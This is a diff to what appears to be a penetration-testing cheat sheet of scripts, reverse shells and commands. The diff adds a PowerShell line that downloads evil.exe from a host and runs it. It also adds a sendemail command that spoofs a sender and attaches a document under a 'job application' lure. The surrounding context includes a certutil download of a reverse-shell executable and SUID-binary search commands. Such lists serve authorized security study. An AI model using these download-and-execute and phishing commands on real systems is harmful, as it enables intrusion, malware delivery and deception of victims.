@@ -10,6 +10,10 @@ Compendium:  A concise but detailed collection of Scripts, Reverse Shells and Co
 ```
 certutil -urlcache -split -f http://192.168.119.199/reverse_5555.exe reverse_5555.exe
 ```
+#Upload payload and run
+```
+Invoke-WebRequest -Uri http://192.168.1.1/evil.exe -Outfile evil.exe; .\evil.exe
+```
 
 
 ## PTY Shells - More Coming soon 
@@ -286,6 +290,10 @@ find / -perm -4000 2>/dev/null
 find / -perm -2000 2>/dev/null
 ```
 
+#Email from the command line 
+```
+sendemail -t blah@<addredss> -f Wakey@hi.com -s <IP of Target> -m "This is a super important messaage -u "My job application" -a <attachmennME.DOCX>
+```
 
 ## Living off the Land
 
